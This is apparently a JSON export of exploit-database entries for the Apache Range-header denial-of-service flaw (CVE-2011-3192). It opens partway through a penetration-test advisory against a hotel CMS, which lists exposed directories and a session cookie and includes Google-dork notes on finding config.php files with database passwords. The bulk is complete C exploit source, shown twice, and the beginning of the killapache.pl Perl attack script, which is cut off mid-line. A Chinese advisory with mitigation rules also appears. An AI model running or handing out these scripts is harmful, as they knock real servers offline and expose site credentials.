\n/mpa/core/js/plugins/ckfinder/plugins/gallery   \n/mpa/core/js/plugins/ckfinder/plugins/gallery/colorbox   \n/mpa/core/js/plugins/ckfinder/plugins/gallery/colorbox/images   \n/mpa/core/js/plugins/ckfinder/plugins/gallery/colorbox/images/ie6   \n/mpa/core/js/plugins/ckfinder/plugins/imageresize   \n/mpa/core/js/plugins/ckfinder/plugins/imageresize/images   \n/mpa/core/js/plugins/ckfinder/plugins/watermark   \n/mpa/core/js/plugins/ckfinder/plugins/zip   \n/mpa/core/js/plugins/ckfinder/plugins/zip/images   \n/mpa/core/js/plugins/ckfinder/skins   \n/mpa/core/js/plugins/ckfinder/skins/kama   \n/mpa/core/js/plugins/ckfinder/skins/kama/images   \n/mpa/core/js/plugins/ckfinder/skins/kama/images/icons   \n/mpa/core/js/plugins/ckfinder/skins/kama/images/icons/16   \n/mpa/core/js/plugins/ckfinder/skins/kama/images/icons/32   \n/mpa/core/js/plugins/ckfinder/skins/kama/images/loaders   \n/mpa/core/js/plugins/ckfinder/skins/kama/images/toolbar   \n/mpa/core/js/plugins/ckfinder/skins/v1   \n/mpa/core/js/plugins/ckfinder/skins/v1/images   \n/mpa/core/js/plugins/ckfinder/skins/v1/images/icons   \n/mpa/core/js/plugins/ckfinder/skins/v1/images/icons/16   \n/mpa/core/js/plugins/ckfinder/skins/v1/images/icons/32   \n/mpa/core/js/plugins/ckfinder/skins/v1/images/loaders   \n/mpa/core/js/plugins/ckfinder/skins/v1/images/toolbar   \n/mpa/core/js/plugins/ckfinder/userfiles   \n/mpa/core/js/plugins/tinymce   \n/mpa/core/js/plugins/tinymce/langs   \n/mpa/core/js/plugins/tinymce/plugins   \n/mpa/core/js/plugins/tinymce/plugins/advhr   \n/mpa/core/js/plugins/tinymce/plugins/advhr/css   \n/mpa/core/js/plugins/tinymce/plugins/advhr/js   \n/mpa/core/js/plugins/tinymce/plugins/advhr/langs   \n/mpa/core/js/plugins/tinymce/plugins/advimage   \n/mpa/core/js/plugins/tinymce/plugins/advimage/css   \n/mpa/core/js/plugins/tinymce/plugins/advimage/img   \n/mpa/core/js/plugins/tinymce/plugins/advimage/js   \n/mpa/core/js/plugins/tinymce/plugins/advimage/langs   \n/mpa/core/js/plugins/tinymce/plugins/advlink   \n/mpa/core/js/plugins/tinymce/plugins/advlink/css   \n/mpa/core/js/plugins/tinymce/plugins/advlink/js   \n/mpa/core/js/plugins/tinymce/plugins/advlink/langs   \n/mpa/core/js/plugins/tinymce/plugins/advlist   \n/mpa/core/js/plugins/tinymce/plugins/autolink   \n/mpa/core/js/plugins/tinymce/plugins/autoresize   \n/mpa/core/js/plugins/tinymce/plugins/autosave   \n/mpa/core/js/plugins/tinymce/plugins/autosave/langs   \n/mpa/core/js/plugins/tinymce/plugins/bbcode   \n/mpa/core/js/plugins/tinymce/plugins/contextmenu   \n/mpa/core/js/plugins/tinymce/plugins/directionality   \n/mpa/core/js/plugins/tinymce/plugins/emotions   \n/mpa/core/js/plugins/tinymce/plugins/emotions/img   \n/mpa/core/js/plugins/tinymce/plugins/emotions/js   \n/mpa/core/js/plugins/tinymce/plugins/emotions/langs   \n/mpa/core/js/plugins/tinymce/plugins/example   \n/mpa/core/js/plugins/tinymce/plugins/example/img   \n/mpa/core/js/plugins/tinymce/plugins/example/js   \n/mpa/core/js/plugins/tinymce/plugins/example/langs   \n/mpa/core/js/plugins/tinymce/plugins/example_dependency   \n/mpa/core/js/plugins/tinymce/plugins/fullpage   \n/mpa/core/js/plugins/tinymce/plugins/fullpage/css   \n/mpa/core/js/plugins/tinymce/plugins/fullpage/js   \n/mpa/core/js/plugins/tinymce/plugins/fullpage/langs   \n/mpa/core/js/plugins/tinymce/plugins/fullscreen   \n/mpa/core/js/plugins/tinymce/plugins/iespell   \n/mpa/core/js/plugins/tinymce/plugins/inlinepopups   \n/mpa/core/js/plugins/tinymce/plugins/inlinepopups/skins   \n/mpa/core/js/plugins/tinymce/plugins/inlinepopups/skins/clearlooks2   \n/mpa/core/js/plugins/tinymce/plugins/inlinepopups/skins/clearlooks2/img   \n/mpa/core/js/plugins/tinymce/plugins/inlinepopups/skins/themepixels   \n/mpa/core/js/plugins/tinymce/plugins/inlinepopups/skins/themepixels/img   \n/mpa/core/js/plugins/tinymce/plugins/insertdatetime   \n/mpa/core/js/plugins/tinymce/plugins/layer   \n/mpa/core/js/plugins/tinymce/plugins/legacyoutput   \n/mpa/core/js/plugins/tinymce/plugins/lists   \n/mpa/core/js/plugins/tinymce/plugins/media   \n/mpa/core/js/plugins/tinymce/plugins/media/css   \n/mpa/core/js/plugins/tinymce/plugins/media/js   \n/mpa/core/js/plugins/tinymce/plugins/media/langs   \n/mpa/core/js/plugins/tinymce/plugins/nonbreaking   \n/mpa/core/js/plugins/tinymce/plugins/noneditable   \n/mpa/core/js/plugins/tinymce/plugins/pagebreak   \n/mpa/core/js/plugins/tinymce/plugins/paste   \n/mpa/core/js/plugins/tinymce/plugins/paste/js   \n/mpa/core/js/plugins/tinymce/plugins/paste/langs   \n/mpa/core/js/plugins/tinymce/plugins/preview   \n/mpa/core/js/plugins/tinymce/plugins/preview/jscripts   \n/mpa/core/js/plugins/tinymce/plugins/print   \n/mpa/core/js/plugins/tinymce/plugins/save   \n/mpa/core/js/plugins/tinymce/plugins/searchreplace   \n/mpa/core/js/plugins/tinymce/plugins/searchreplace/css   \n/mpa/core/js/plugins/tinymce/plugins/searchreplace/js   \n/mpa/core/js/plugins/tinymce/plugins/searchreplace/langs   \n/mpa/core/js/plugins/tinymce/plugins/spellchecker   \n/mpa/core/js/plugins/tinymce/plugins/spellchecker/css   \n/mpa/core/js/plugins/tinymce/plugins/spellchecker/img   \n/mpa/core/js/plugins/tinymce/plugins/style   \n/mpa/core/js/plugins/tinymce/plugins/style/css   \n/mpa/core/js/plugins/tinymce/plugins/style/js   \n/mpa/core/js/plugins/tinymce/plugins/style/langs   \n/mpa/core/js/plugins/tinymce/plugins/tabfocus   \n/mpa/core/js/plugins/tinymce/plugins/table   \n/mpa/core/js/plugins/tinymce/plugins/table/css   \n/mpa/core/js/plugins/tinymce/plugins/table/js   \n/mpa/core/js/plugins/tinymce/plugins/table/langs   \n/mpa/core/js/plugins/tinymce/plugins/template   \n/mpa/core/js/plugins/tinymce/plugins/template/css   \n/mpa/core/js/plugins/tinymce/plugins/template/js   \n/mpa/core/js/plugins/tinymce/plugins/template/langs   \n/mpa/core/js/plugins/tinymce/plugins/visualblocks   \n/mpa/core/js/plugins/tinymce/plugins/visualblocks/css   \n/mpa/core/js/plugins/tinymce/plugins/visualchars   \n/mpa/core/js/plugins/tinymce/plugins/wordcount   \n/mpa/core/js/plugins/tinymce/themes   \n/mpa/core/js/plugins/tinymce/themes/advanced   \n/mpa/core/js/plugins/tinymce/themes/advanced/img   \n/mpa/core/js/plugins/tinymce/themes/advanced/js   \n/mpa/core/js/plugins/tinymce/themes/advanced/langs   \n/mpa/core/js/plugins/tinymce/themes/advanced/skins   \n/mpa/core/js/plugins/tinymce/themes/advanced/skins/default   \n/mpa/core/js/plugins/tinymce/themes/advanced/skins/default/img   \n/mpa/core/js/plugins/tinymce/themes/advanced/skins/highcontrast   \n/mpa/core/js/plugins/tinymce/themes/advanced/skins/o2k7   \n/mpa/core/js/plugins/tinymce/themes/advanced/skins/o2k7/img   \n/mpa/core/js/plugins/tinymce/themes/advanced/skins/themepixels   \n/mpa/core/js/plugins/tinymce/themes/advanced/skins/themepixels/img   \n/mpa/core/js/plugins/tinymce/themes/simple   \n/mpa/core/js/plugins/tinymce/themes/simple/img   \n/mpa/core/js/plugins/tinymce/themes/simple/langs   \n/mpa/core/js/plugins/tinymce/themes/simple/skins   \n/mpa/core/js/plugins/tinymce/themes/simple/skins/default   \n/mpa/core/js/plugins/tinymce/themes/simple/skins/o2k7   \n/mpa/core/js/plugins/tinymce/themes/simple/skins/o2k7/img   \n/mpa/core/js/plugins/tinymce/utils   \n/mpa/core/lang   \n/mpa/core/pdf   \n  \n  \nFiles uploaded through FTP  \n  \nAffected items  \n  \n/mpa/core/js/plugins/ckfinder/core/connector/php/php5/CommandHandler   \n/mpa/core/js/plugins/ckfinder/core/connector/php/php5/ErrorHandler   \n/mpa/core/js/plugins/ckfinder/help/files/images   \n/mpa/core/js/plugins/ckfinder/plugins   \n/mpa/core/js/plugins/ckfinder/plugins/flashupload   \n/mpa/core/js/plugins/ckfinder/plugins/flashupload/flash   \n  \n  \n  \nMp3 file  \n  \n  \nYes! I probably have should have told you guys earlier,  \nbut this is how ive been getting 100% of my mp3s. It fricken rocks, use it and abuse it. Downfalls to it...   \n  \na)sometimes you shouldnt include mp3 in the query and getting what you want takes several different methods of searching  \nb)a lot of the time google gives you results and they are not there thanks to good old friend 404   \nc)finding stuff takes a lot of practice.  \n  \nGoods...   \n  \na)ive found whole albums   \nb)ive mass downloaded directories of hundreds of songs that i have intrest in   \nc)its exciting seeing the results, like fining treasure.  \n  \nAffected items  \n  \n/mpa/core/js/plugins/ckfinder/skins/kama/images/icons/16   \n/mpa/core/js/plugins/ckfinder/skins/kama/images/icons/32   \n/mpa/core/js/plugins/ckfinder/skins/v1/images/icons/16   \n/mpa/core/js/plugins/ckfinder/skins/v1/images/icons/32   \n  \n  \n  \nPHP configuration file (config.php)   \n  \n  \nThis search brings up sites with \"config.php\" files. To skip the technical discussion,  \nthis configuration file contains both a username and a password for an SQL database.  \nMost sites with forums run a PHP message base. This file gives you the keys to that forum,  \nincluding FULL ADMIN access to the database. Way to go, googleDorks!!  \n  \nAffected items  \n  \n/mpa/core/js/plugins/ckfinder   \n/mpa/core/js/plugins/ckfinder/core/connector/php/php5/Core   \n  \n  \nInsecure transition from HTTPS to HTTP in form post  \n***************************************************  \nThis secure (https) page contains a form that is posting to an insecure (http) page.  \nThis could confuse users who may think their data is encrypted when in fact it's not.  \n  \nThis vulnerability affects  \n  \n/mpa/core/js/plugins/ckfinder/help/es/files/suggestions.html.   \n  \nAttack details  \n--------------  \n  \nForm name: \"\"  \n  \nForm action: \"http://cksource.com/ckfinder/doc_suggestion\"  \n  \nGET /mpa/core/js/plugins/ckfinder/help/es/files/suggestions.html   \n  \nReferer: https://secureadv.obehotel.com/mpa/core/js/plugins/ckfinder/help/es/files/toc.html  \n  \nCookie: PHPSESSID=sto2bv4krb2h4f0n45tm6o4hn3  \n  \nHost: secureadv.obehotel.com  \n  \nConnection: Keep-alive  \n  \nAccept-Encoding: gzip,deflate  \n  \nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)  \n  \nAccept: */*  \n  \nResponse:  \n  \nServer: Apache/2.2.16 (Debian)  \nLast-Modified: Fri, 24 Aug 2012 02:49:24 GMT  \n  \nETag: \"30119b-696-4c7fa060b5500\"  \n  \nAccept-Ranges: bytes  \nVary: Accept-Encoding  \nContent-Length: 1686  \nKeep-Alive: timeout=15, max=29  \nConnection: Keep-Alive  \nContent-Type: text/html; charset=ISO-8859-15  \n  \n  \nIV. CREDITS  \n-------------------------  \n  \nThis vulnerability has been discovered  \nby Juan Carlos Garc\u00eda(@secnight)  \n  \nSpecial thanks to Javier Garcia Garcia for showing me this Spanish \"CMS\" for Penetration Testing  \n  \nV. LEGAL NOTICES  \n-------------------------  \n  \nThe Author accepts no responsibility for any damage  \ncaused by the use or misuse of this information.  \n`\n",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:122962"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache HTTP Server Denial of Service. CVE-2011-3192,CVE-2014-5329. Dos exploit for linux platform",
            "modified": "2011-12-09T00:00:00",
            "published": "2011-12-09T00:00:00",
            "id": "EDB-ID:18221",
            "href": "https://www.exploit-db.com/exploits/18221/",
            "type": "exploitdb",
            "title": "Apache HTTP Server Denial of Service",
            "sourceData": "/*\r\n * This is a reverse engineered version of the exploit for CVE-2011-3192 made\r\n * by ev1lut10n (http://jayakonstruksi.com/backupintsec/rapache.tgz).\r\n * Copyright 2011 Ramon de C Valle <rcvalle@redhat.com>\r\n *\r\n * Compile with the following command:\r\n * gcc -Wall -pthread -o rcvalle-rapache rcvalle-rapache.c\r\n */\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <sys/ptrace.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netdb.h>\r\n#include <unistd.h>\r\n#include <pthread.h>\r\n\r\nvoid ptrace_trap(void) __attribute__ ((constructor));\r\n\r\nvoid\r\nptrace_trap(void) {\r\n    if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {\r\n        write(fileno(stdout), \"Segmentation fault\\n\", 19);\r\n        exit(-1);\r\n    }\r\n}\r\n\r\nvoid\r\nw4rn41dun14mu(int attr, int fg, int bg)\r\n{\r\n    char command[13];\r\n\r\n    sprintf(command, \"%c[%d;%d;%dm\", 0x1b, attr, fg+30, bg+40);\r\n    printf(\"%s\", command);\r\n}\r\n\r\nvoid\r\nbanner()\r\n{\r\n    w4rn41dun14mu(0, 1, 0);\r\n    fwrite(\"Remote Apache Denial of Service Exploit by ev1lut10n\\n\", 53, 1,\r\n           stdout);\r\n}\r\n\r\nvoid\r\ngime_er_mas()\r\n{\r\n    printf(\"%c%s\", 0x1b, \"[2J\");\r\n    printf(\"%c%s\", 0x1b, \"[1;1H\");\r\n    puts(\"\\nsorry dude there's an error...\");\r\n}\r\n\r\nstruct thread_info {\r\n    pthread_t thread_id;\r\n    int       thread_num;\r\n    char     *argv_string;\r\n};\r\n\r\nstatic void *\r\nthread_start(void *arg)\r\n{\r\n    struct thread_info *tinfo = (struct thread_info *) arg;\r\n    char hostname[64];\r\n    int j;\r\n\r\n    strcpy(hostname, tinfo->argv_string);\r\n\r\n    j = 0;\r\n    while (j != 10) {\r\n        struct addrinfo hints;\r\n        struct addrinfo *result, *rp;\r\n        int sfd, s;\r\n        ssize_t nwritten;\r\n\r\n        memset(&hints, 0, sizeof(struct addrinfo));\r\n        hints.ai_family = AF_UNSPEC;\r\n        hints.ai_socktype = SOCK_STREAM;\r\n        hints.ai_flags = 0;\r\n        hints.ai_protocol = 0;\r\n\r\n        s = getaddrinfo(hostname, \"http\", &hints, &result);\r\n        if (s != 0) {\r\n            fprintf(stderr, \"getaddrinfo: %s\\n\", gai_strerror(s));\r\n            exit(EXIT_FAILURE);\r\n        }\r\n\r\n        for (rp = result; rp != NULL; rp = rp->ai_next) {\r\n            sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);\r\n            if (sfd == -1)\r\n                continue;\r\n\r\n            if (connect(sfd, rp->ai_addr, rp->ai_addrlen) == -1)\r\n                close(sfd);\r\n        }\r\n\r\n        if (result != NULL)\r\n            freeaddrinfo(result);\r\n\r\n        nwritten = write(sfd, \"HEAD / HTTP/1.1\\n\"\r\n                              \"Host:localhost\\n\"\r\n                              \"Range:bytes=0-,0-\\n\"\r\n                              \"Accept-Encoding: gzip\", 71);\r\n        if (nwritten == -1)\r\n            close(sfd);\r\n\r\n        usleep(300000);\r\n\r\n        j++;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nint\r\nmain(int argc, char *argv[])\r\n{\r\n    int i;\r\n    struct thread_info tinfo;\r\n\r\n    banner();\r\n\r\n    if (argc <= 1) {\r\n        w4rn41dun14mu(0, 2, 0);\r\n        fwrite(\"\\n[-] Usage : ./rapache hostname\\n\", 32, 1, stdout);\r\n        return 0;\r\n    }\r\n\r\n    w4rn41dun14mu(0, 3, 0);\r\n    printf(\"[+] Attacking %s please wait  in minutes ...\\n\", argv[1]);\r\n\r\n    while (1) {\r\n        i = 0;\r\n        while (i != 50) {\r\n            tinfo.thread_num = i;\r\n            tinfo.argv_string = argv[1];\r\n\r\n            pthread_create(&tinfo.thread_id, NULL, &thread_start, &tinfo);\r\n\r\n            usleep(500000);\r\n\r\n            i++;\r\n        }\r\n    }\r\n}\r\n",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:18221"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2011-12-09T00:00:00",
            "published": "2011-12-09T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-26043",
            "id": "SSV:26043",
            "type": "seebug",
            "title": "Apache Range Header Denial Of Service",
            "sourceData": "\n                                                /*\r\n * This is a reverse engineered version of the exploit for CVE-2011-3192 made\r\n * by ev1lut10n (http://jayakonstruksi.com/backupintsec/rapache.tgz).\r\n * Copyright 2011 Ramon de C Valle &lt;rcvalle@redhat.com&gt;\r\n * This is a reverse engineered version of the exploit by ev1lut10n that triggers a denial of service condition using a vulnerability in the Range header of Apache versions 1.3.x, 2.0.64 and below and 2.2.19 and below\r\n *\r\n * Compile with the following command:\r\n * gcc -Wall -pthread -o rcvalle-rapache rcvalle-rapache.c\r\n */\r\n\r\n#include &lt;stdio.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;string.h&gt;\r\n#include &lt;sys/ptrace.h&gt;\r\n#include &lt;sys/types.h&gt;\r\n#include &lt;sys/socket.h&gt;\r\n#include &lt;netdb.h&gt;\r\n#include &lt;unistd.h&gt;\r\n#include &lt;pthread.h&gt;\r\n\r\nvoid ptrace_trap(void) __attribute__ ((constructor));\r\n\r\nvoid\r\nptrace_trap(void) {\r\n    if (ptrace(PTRACE_TRACEME, 0, 0, 0) &lt; 0) {\r\n        write(fileno(stdout), &quot;Segmentation fault\\n&quot;, 19);\r\n        exit(-1);\r\n    }\r\n}\r\n\r\nvoid\r\nw4rn41dun14mu(int attr, int fg, int bg)\r\n{\r\n    char command[13];\r\n\r\n    sprintf(command, &quot;%c[%d;%d;%dm&quot;, 0x1b, attr, fg+30, bg+40);\r\n    printf(&quot;%s&quot;, command);\r\n}\r\n\r\nvoid\r\nbanner()\r\n{\r\n    w4rn41dun14mu(0, 1, 0);\r\n    fwrite(&quot;Remote Apache Denial of Service Exploit by ev1lut10n\\n&quot;, 53, 1,\r\n           stdout);\r\n}\r\n\r\nvoid\r\ngime_er_mas()\r\n{\r\n    printf(&quot;%c%s&quot;, 0x1b, &quot;[2J&quot;);\r\n    printf(&quot;%c%s&quot;, 0x1b, &quot;[1;1H&quot;);\r\n    puts(&quot;\\nsorry dude there's an error...&quot;);\r\n}\r\n\r\nstruct thread_info {\r\n    pthread_t thread_id;\r\n    int       thread_num;\r\n    char     *argv_string;\r\n};\r\n\r\nstatic void *\r\nthread_start(void *arg)\r\n{\r\n    struct thread_info *tinfo = (struct thread_info *) arg;\r\n    char hostname[64];\r\n    int j;\r\n\r\n    strcpy(hostname, tinfo-&gt;argv_string);\r\n\r\n    j = 0;\r\n    while (j != 10) {\r\n        struct addrinfo hints;\r\n        struct addrinfo *result, *rp;\r\n        int sfd, s;\r\n        ssize_t nwritten;\r\n\r\n        memset(&amp;hints, 0, sizeof(struct addrinfo));\r\n        hints.ai_family = AF_UNSPEC;\r\n        hints.ai_socktype = SOCK_STREAM;\r\n        hints.ai_flags = 0;\r\n        hints.ai_protocol = 0;\r\n\r\n        s = getaddrinfo(hostname, &quot;http&quot;, &amp;hints, &amp;result);\r\n        if (s != 0) {\r\n            fprintf(stderr, &quot;getaddrinfo: %s\\n&quot;, gai_strerror(s));\r\n            exit(EXIT_FAILURE);\r\n        }\r\n\r\n        for (rp = result; rp != NULL; rp = rp-&gt;ai_next) {\r\n            sfd = socket(rp-&gt;ai_family, rp-&gt;ai_socktype, rp-&gt;ai_protocol);\r\n            if (sfd == -1)\r\n                continue;\r\n\r\n            if (connect(sfd, rp-&gt;ai_addr, rp-&gt;ai_addrlen) == -1)\r\n                close(sfd);\r\n        }\r\n\r\n        if (result != NULL)\r\n            freeaddrinfo(result);\r\n\r\n        nwritten = write(sfd, &quot;HEAD / HTTP/1.1\\n&quot;\r\n                              &quot;Host:localhost\\n&quot;\r\n                              &quot;Range:bytes=0-,0-\\n&quot;\r\n                              &quot;Accept-Encoding: gzip&quot;, 71);\r\n        if (nwritten == -1)\r\n            close(sfd);\r\n\r\n        usleep(300000);\r\n\r\n        j++;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nint\r\nmain(int argc, char *argv[])\r\n{\r\n    int i;\r\n    struct thread_info tinfo;\r\n\r\n    banner();\r\n\r\n    if (argc &lt;= 1) {\r\n        w4rn41dun14mu(0, 2, 0);\r\n        fwrite(&quot;\\n[-] Usage : ./rapache hostname\\n&quot;, 32, 1, stdout);\r\n        return 0;\r\n    }\r\n\r\n    w4rn41dun14mu(0, 3, 0);\r\n    printf(&quot;[+] Attacking %s please wait  in minutes ...\\n&quot;, argv[1]);\r\n\r\n    while (1) {\r\n        i = 0;\r\n        while (i != 50) {\r\n            tinfo.thread_num = i;\r\n            tinfo.argv_string = argv[1];\r\n\r\n            pthread_create(&amp;tinfo.thread_id, NULL, &amp;thread_start, &amp;tinfo);\r\n\r\n            usleep(500000);\r\n\r\n            i++;\r\n        }\r\n    }\r\n}\n                              ",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:26043"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 49303\r\nCVE ID: CVE-2011-3192\r\n\r\nApache HTTP Server\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\u7684\u7f51\u9875\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u5927\u591a\u6570\u7535\u8111\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\uff0c\u7531\u4e8e\u5176\u8de8\u5e73\u53f0\u548c\u5b89\u5168\u6027\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u662f\u6700\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u7aef\u8f6f\u4ef6\u4e4b\u4e00\u3002\r\n\r\nApache HTTP Server\u5728\u5904\u7406Range\u9009\u9879\u751f\u6210\u56de\u5e94\u65f6\u5b58\u5728\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528\u6b64\u6f0f\u6d1e\u901a\u8fc7\u53d1\u9001\u6076\u610f\u8bf7\u6c42\u5bfc\u81f4\u670d\u52a1\u5668\u5931\u53bb\u54cd\u5e94\uff0c\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002\r\n\r\n\u6b64\u6f0f\u6d1e\u6e90\u4e8eApache HTTP Server\u5728\u5904\u7406Range\u5934\u9009\u9879\u4e2d\u5305\u542b\u7684\u5927\u91cf\u91cd\u53e0\u8303\u56f4\u6307\u5b9a\u547d\u4ee4\u65f6\u5b58\u5728\u7684\u95ee\u9898\uff0c\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u7279\u5236HTTTP\u8bf7\u6c42\u8017\u5c3d\u7cfb\u7edf\u8d44\u6e90\uff0c\u5bfc\u81f4Apache\u5931\u53bb\u54cd\u5e94\uff0c\u751a\u81f3\u9020\u6210\u64cd\u4f5c\u7cfb\u7edf\u8d44\u6e90\u8017\u5c3d\u3002\n\nApache 2.x\r\nApache 1.3\n\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a\r\n\r\n\u5728\u5382\u5546\u63d0\u4f9b\u5b98\u65b9\u8865\u4e01\u6216\u65b0\u7248\u672c\u8f6f\u4ef6\u4e4b\u524d\uff0c\u5efa\u8bae\u7528\u6237\u91c7\u7528\u5982\u4e0b\u7684\u914d\u7f6e\u65b9\u6848\u4e4b\u4e00\u4ee5\u5c3d\u53ef\u80fd\u514d\u53d7\u6f0f\u6d1e\u7684\u5f71\u54cd\uff1a\r\n\r\n* \u4f7f\u7528SetEnvIf\u914d\u7f6e\u547d\u4ee4\u6765\u5ffd\u7565\u7578\u5f62\u7684Ranger\u9009\u9879\uff0c\u9002\u7528\u4e8eApache 2.0\u548c2.2 \u3002\r\n\r\n    \u4fee\u6539Apache\u7684\u914d\u7f6e\u6587\u4ef6httpd.conf\u3002\r\n  \r\n    \u53bb\u6389\u5982\u4e0b\u884c\u7684\u6ce8\u91ca\uff1a\r\n  \r\n    LoadModule headers_module modules/mod_headers.so\r\n  \r\n    \u589e\u52a0\u5982\u4e0b\u884c\u7684\u914d\u7f6e\u547d\u4ee4\uff1a\r\n\r\n    SetEnvIf Range (,.*?){5,} bad-range=1\r\n    RequestHeader unset Range env=bad-range\r\n\r\n    \u91cd\u542fApache\u670d\u52a1\u5668\u3002\r\n  \r\n* \u5b89\u88c5\u542f\u7528mod_rewrite\uff0c\u8bbe\u7f6e\u89c4\u5219\u8fc7\u6ee4\u89c4\u5219\u7981\u6b62\u5e26\u6709\u7578\u5f62\u7684Ranger\u9009\u9879\u7684\u8bf7\u6c42\uff0c\u9002\u7528\u4e8e\u6240\u6709\u7248\u672c\u7684\r\n  Apache \u3002\r\n\r\n    \u4fee\u6539Apache\u7684\u914d\u7f6e\u6587\u4ef6httpd.conf\u3002\r\n  \r\n    \u53bb\u6389\u5982\u4e0b\u884c\u7684\u6ce8\u91ca\uff1a\r\n  \r\n    LoadModule rewrite_module modules/mod_rewrite.so\r\n\r\n    \u52a0\u5165\u5982\u4e0b\u7684mod_rewrite\u7684\u89c4\u5219\u914d\u7f6e\u884c\uff1a\r\n  \r\n    RewriteEngine on\r\n    RewriteCond %{HTTP:range} !(^bytes=[^,]+(,[^,]+){0,4}$|^$)\r\n    RewriteRule .* - [F]\r\n    \r\n    \u91cd\u542fApache\u670d\u52a1\u5668\u3002\r\n\r\n\r\n\u4e0a\u8ff0\u4e24\u79cd\u914d\u7f6e\u4f1a\u7981\u6b62Range\u9009\u9879\u5305\u542b\u8d85\u8fc75\u4e2a\u8303\u56f4\u6307\u5b9a\u547d\u4ee4\u7684\u8bf7\u6c42\uff0c\u5728\u901a\u5e38\u5e94\u7528\u573a\u666f\u4e2d\u5bf9Web\u5e94\u7528\u5e94\u8be5\u4e0d\u4f1a\u6709\u4ec0\u4e48\u5f71\u54cd\uff0c\u5982\u679cWeb\u5e94\u7528\u63d0\u4f9bPDF\u6570\u636e\u6216\u6d41\u5a92\u4f53\u4fe1\u606f\uff0c\u53ef\u80fd\u9700\u8981\u8c03\u6574\u9608\u503c\u5230\u66f4\u5927\u7684\u6570\u503c\u3002\r\n\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u8fd8\u6ca1\u6709\u63d0\u4f9b\u8865\u4e01\u6216\u8005\u5347\u7ea7\u7a0b\u5e8f\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u6b64\u8f6f\u4ef6\u7684\u7528\u6237\u968f\u65f6\u5173\u6ce8\u5382\u5546\u7684\u4e3b\u9875\u4ee5\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff1a\r\n\r\nhttp://www.apache.org",
            "modified": "2011-08-26T00:00:00",
            "published": "2011-08-26T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20899",
            "id": "SSV:20899",
            "type": "seebug",
            "title": "Apache HTTP Server\u7578\u5f62Range\u9009\u9879\u5904\u7406\u8fdc\u7a0b\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "sourceData": "\n                                                \r\nSSV-ID: 20882\r\nhttp://sebug.net/exploit/20882/\n                              ",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20899"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache httpd Remote Denial of Service (memory exhaustion). CVE-2011-3192,CVE-2014-5329. Dos exploits for multiple platform",
            "modified": "2011-08-19T00:00:00",
            "published": "2011-08-19T00:00:00",
            "id": "EDB-ID:17696",
            "href": "https://www.exploit-db.com/exploits/17696/",
            "type": "exploitdb",
            "title": "Apache httpd Remote Denial of Service memory exhaustion",
            "sourceData": "#Apache httpd Remote Denial of Service (memory exhaustion)\r\n#By Kingcope\r\n#Year 2011\r\n#\r\n# Will result in swapping memory to filesystem on the remote side\r\n# plus killing of processes when running out of swap space.\r\n# Remote System becomes unstable.\r\n#\r\n\r\nuse IO::Socket;\r\nuse Parallel::ForkManager;\r\n\r\nsub usage {\r\n\tprint \"Apache Remote Denial of Service (memory exhaustion)\\n\";\r\n\tprint \"by Kingcope\\n\";\r\n\tprint \"usage: perl killapache.pl <host> [numforks]\\n\";\r\n\tprint \"example: perl killapache.pl www.example.com 50\\n\";\r\n}\r\n\r\nsub killapache {\r\nprint \"ATTACKING $ARGV[0] [using $numforks forks]\\n\";\r\n\t\r\n$pm = new Parallel::ForkManager($numforks);\r\n\r\n$|=1;\r\nsrand(time());\r\n$p = \"\";\r\nfor ($k=0;$k<1300;$k++) {\r\n\t$p .= \",5-$k\";\r\n}\r\n\r\nfor ($k=0;$k<$numforks;$k++) {\r\nmy $pid = $pm->start and next; \t\r\n\t\r\n$x = \"\";\r\nmy $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],\r\n                                 PeerPort => \"80\",\r\n                     \t\t\t Proto    => 'tcp');\r\n\r\n$p = \"HEAD / HTTP/1.1\\r\\nHost: $ARGV[0]\\r\\nRange:bytes=0-$p\\r\\nAccept-Encoding: 